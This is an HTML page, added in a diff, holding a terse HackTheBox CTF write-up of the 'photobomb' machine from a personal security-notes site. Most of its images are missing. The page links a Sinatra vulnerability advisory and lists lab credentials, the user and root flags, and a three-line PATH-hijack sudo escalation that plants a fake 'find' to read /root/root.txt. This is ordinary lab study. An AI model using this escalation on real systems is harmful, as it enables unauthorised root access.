@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>photobomb · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/machines/photobomb.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/htb/index.html">HackTheBox</a> &rsaquo; <a href="/htb/machines/index.html">Completed Machines</a></div>
+  <h1 id="photobomb">photobomb</h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>https://security.snyk.io/vuln/SNYK-RUBY-SINATRA-22017</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>found creds again</p>
+<pre><code>pH0t0:b0Mb!
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>shell</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>user flag</p>
+<pre><code>89a42badc271690345458192c3aec560
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>opt cleanuo.sh</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>root flag</p>
+<pre><code>719e71acd34f1d2fee3f9bb2f728719f
+</code></pre>
+<pre><code>echo &quot;cat /root/root.txt; #&quot; &gt; find
+chmod +x find
+sudo PATH=`pwd`:$PATH /opt/cleanup.sh
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<h2 id="contents">Contents</h2>
+<ul>
+<li><a href="/htb/machines/photobomb/incomplete-red-failureforensic-challenge.html">INCOMPLETE Red Failure(Forensic Challenge)</a></li>
+</ul>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
